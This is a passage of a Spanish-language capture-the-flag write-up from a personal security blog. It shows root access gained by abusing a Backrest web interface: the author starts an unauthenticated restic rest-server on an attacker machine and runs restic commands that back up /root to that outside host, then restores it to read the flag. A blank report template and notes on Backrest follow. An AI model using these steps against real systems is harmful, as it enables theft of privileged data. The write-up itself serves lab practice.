<p>Luego acced√≠ a √©l a trav√©s de:</p>
</li>
<li>
<p><a href="http://localhost:9898">http://localhost:9898</a></p>
</li>
<li>
<p>Detalles de inicio de sesi√≥n:</p>
</li>
</ul>
<p>Nombre de usuario: backrest_root<br>
Contrase√±a: !@# $% ^</p>
<h2 id="abusar-de-restic-para-el-acceso-root">Abusar de Restic para el acceso root</h2>
<ul>
<li>
<p>Una vez que obtuve acceso de administrador a la interfaz web de Backrest, vi la oportunidad de abusar de su funci√≥n de restauraci√≥n para enviar copias de seguridad a un servidor que yo controlaba. Para ello, necesitaba configurar un receptor compatible con Restic.</p>
</li>
<li>
<p>Qu√© es Backrest (Para restic):</p>
</li>
</ul>
<p><strong>Es una interfaz web + orquestador para la herramienta de backup restic.
Permite crear repositorios de backup, programar backups autom√°ticamente, y realizar mantenimientos como ‚Äúprune‚Äù, ‚Äúforget‚Äù, ‚Äúcheck‚Äù.
En la interfaz puedes explorar snapshots (versiones guardadas), navegar contenido de backups, y restaurar archivos v√≠a web.
Ofrece hooks previos o posteriores al backup para ejecutar comandos personalizados.
Compatible con m√∫ltiples backend de almacenamiento (local, S3, Azure, rclone, SFTP).
Puede configurarse en Docker, Linux, macOS, Windows.</strong></p>
<ul>
<li>
<p>GTFOBins: <a href="https://gtfobins.github.io/gtfobins/restic/">https://gtfobins.github.io/gtfobins/restic/</a></p>
</li>
<li>
<p>Lanc√© una instancia de servidor Rest en mi m√°quina atacante:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">rest-server</span><span style="color:#BD93F9"> --path</span><span style="color:#F1FA8C"> /tmp/restic-data</span><span style="color:#BD93F9"> --listen</span><span style="color:#F1FA8C"> :12345</span><span style="color:#BD93F9"> --no-auth</span></span>
<span class="line"></span></code></pre>
<p>Con el oyente activo, estaba listo para configurar el servicio Backrest del sistema de destino para conectarse a mi m√°quina y volcar datos confidenciales.</p>
<h2 id="creaci√≥n-de-un-repositorio-en-backrest">Creaci√≥n de un repositorio en Backrest</h2>
<p>En la interfaz web de Backrest, navegu√© a la secci√≥n¬†<strong>Repositorios</strong>¬†y hice clic en¬†<strong>Agregar repositorio</strong>¬†.</p>
<ul>
<li>
<p><strong>Nombre:</strong> <code>root_backup</code>.</p>
</li>
<li>
<p><strong>URL del repositorio:</strong>¬†<code>/opt/backrest</code></p>
</li>
<li>
<p><strong>Contrase√±a:</strong>¬†Se puede generar pero se debe recordar o almacenar.</p>
</li>
<li>
<p>Despu√©s de crearlo, el nuevo repositorio apareci√≥ en la pesta√±a¬†<strong>Repositorios</strong>¬†, lo que confirm√≥ que se cre√≥ correctamente.</p>
</li>
</ul>
<h2 id="ejecuci√≥n-de-comandos-restic-para-realizar-copias-de-seguridad-y-restaurar">Ejecuci√≥n de comandos Restic para realizar copias de seguridad y restaurar</h2>
<ul>
<li>
<p>Una vez creado el repositorio en Backrest, hice clic en √©l y fui a la pesta√±a¬†<strong>Ejecutar comando</strong>¬†.</p>
</li>
<li>
<p>A partir de ah√≠, ejecut√© los siguientes pasos en la consola de la aplicacion:</p>
</li>
</ul>
<h3 id="1-inicializar-el-repositorio">1. Inicializar el repositorio</h3>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">-r</span><span style="color:#F1FA8C"> rest:http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">YOUR-I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">:12345/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">repo-nam</span><span style="color:#F8F8F2">e</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> init</span></span>
<span class="line"></span></code></pre>
<h3 id="2-copia-de-seguridadrooten-el-destino">2. Copia de seguridad¬†<code>/root</code>en el destino</h3>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">-r</span><span style="color:#F1FA8C"> rest:http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">YOUR-I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">:12345/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">repo-nam</span><span style="color:#F8F8F2">e</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> backup</span><span style="color:#F1FA8C"> /root</span></span>
<span class="line"></span></code></pre>
<p>![[Pasted image 20250925174248.png]]</p>
<h2 id="listado-y-restauraci√≥n-de-la-instant√°nea">Listado y restauraci√≥n de la instant√°nea</h2>
<p><strong>En la m√°quina atacante: Restauraci√≥n de una instant√°nea</strong></p>
<ul>
<li>
<p>Con el oyente a√∫n ejecut√°ndose en segundo plano, abr√≠ una nueva pesta√±a de terminal para trabajar con los datos de respaldo.</p>
</li>
<li>
<p>Primero, enumer√© todas las instant√°neas disponibles:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">-r</span><span style="color:#F1FA8C"> /tmp/restic-data/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">repo-nam</span><span style="color:#F8F8F2">e</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> snapshots</span></span>
<span class="line"></span></code></pre>
<p>![[Pasted image 20250925164048.png]]</p>
<ul>
<li>
<p>Esto me mostr√≥ cada estado guardado del repositorio, completo con marcas de tiempo e identificaciones.</p>
</li>
<li>
<p>Una vez que tuve la ID de instant√°nea correcta, la restaur√© en una carpeta llamada¬†<code>restore</code>:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">-r</span><span style="color:#F1FA8C"> /tmp/restic-data/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">repo-nam</span><span style="color:#F8F8F2">e</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> restore</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">snapshot-i</span><span style="color:#F8F8F2">d</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --target</span><span style="color:#F1FA8C"> ./restore</span></span>
<span class="line"></span></code></pre>
<h2 id="bandera-ra√≠z">Bandera ra√≠z</h2>
<p>Despu√©s de restaurar la copia de seguridad, vea el indicador ra√≠z:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> restore/root/root.txt</span></span>
<span class="line"></span></code></pre>
<hr>
<h3 id="vulnerabilidades">Vulnerabilidades</h3>
<ul>
<li>
<p>CVE: <code>___</code></p>
</li>
<li>
<p>Nivel: <code>___</code></p>
</li>
</ul>
<h3 id="credenciales">Credenciales</h3>
<ul>
<li>
<p>Usuario: <code>___</code></p>
</li>
<li>
<p>Contrase√±a: <code>___</code></p>
</li>
<li>
<p>Origen (FTP/SSH/Web): <code>___</code></p>
</li>
</ul>
<hr>
<h1 id="-reporte-final">üìå Reporte Final</h1>
<ul>
<li>
<p>Descripci√≥n General: <code>___</code></p>
</li>
<li>
<p>Recomendaciones: <code>___</code></p>
</li>
</ul>
<p><strong>Resumen:</strong></p>
<ul>
<li>
<p>Puertos abiertos: <code>___</code></p>
</li>
<li>
<p>Usuarios v√°lidos: <code>___</code></p>
</li>
<li>
<p>Credenciales √∫tiles: <code>___</code></p>
</li>
<li>
<p>Posibles escaladas: <code>___</code></p>
</li>
<li>
<p>PoC: <code>___</code></p>
</li>
<li>
<p>Impacto: <code>___</code></p>
</li>
<li>
<p>Nivel de acceso logrado: <code>___</code></p>
</li>
</ul>
<hr>
<h1 id="Ô∏è-notas-y-herramientas">üõ†Ô∏è Notas y Herramientas:</h1>
<p>¬øQu√© es Backrest?</p>
<p><strong>Backrest</strong>¬†es una interfaz de usuario web (UI) y una herramienta de orquestaci√≥n para el programa de copias de seguridad de l√≠nea de comandos¬†<em>Restic</em>. Est√° dise√±ado para simplificar el proceso de copia de seguridad tanto para sistemas interactivos como para sistemas sin interfaz gr√°fica (como un servidor dom√©stico o un NAS).¬†</p>
<p>Las caracter√≠sticas clave de Backrest incluyen:¬†</p>
<ul>
<li>
<p><strong>Interfaz web</strong>: Proporciona una interfaz gr√°fica intuitiva para crear y gestionar copias de seguridad, examinar instant√°neas y restaurar archivos.</p>
</li>
<li>
<p><strong>Orquestaci√≥n de copias de seguridad</strong>: Permite a los usuarios configurar calendarios de copias de seguridad, pol√≠ticas de retenci√≥n y tareas de mantenimiento (como¬†<code>prune</code>¬†y¬†<code>check</code>) sin necesidad de escribir scripts manualmente.</p>
</li>
<li>
<p><strong>Compatibilidad multiplataforma</strong>: Disponible para Linux, macOS, Windows, FreeBSD y Docker.</p>
</li>
<li>
<p><strong>Ganchos de notificaci√≥n</strong>: Puede enviar notificaciones a trav√©s de servicios como Discord, Slack y Gotify para eventos de copia de seguridad como √©xito o fracaso.</p>
</li>
<li>
<p><strong>Compatibilidad con Restic</strong>: Como es un wrapper ligero, Backrest crea repositorios Restic est√°ndar que se pueden seguir gestionando manualmente a trav√©s de la herramienta de l√≠nea de comandos de Restic.</p>
</li>
</ul> </div> <!-- FOOTER DEL ART√çCULO --> <div class="mt-16 pt-8 border-t border-slate-800 text-center"> <a href="/writeups" class="text-slate-400 hover:text-accentBlue transition-colors">
‚Üê Volver a la lista de writeups
</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
¬© 2025 Angel Corral ‚Äî Ciberseguridad
</div> </footer> </div> </body></html>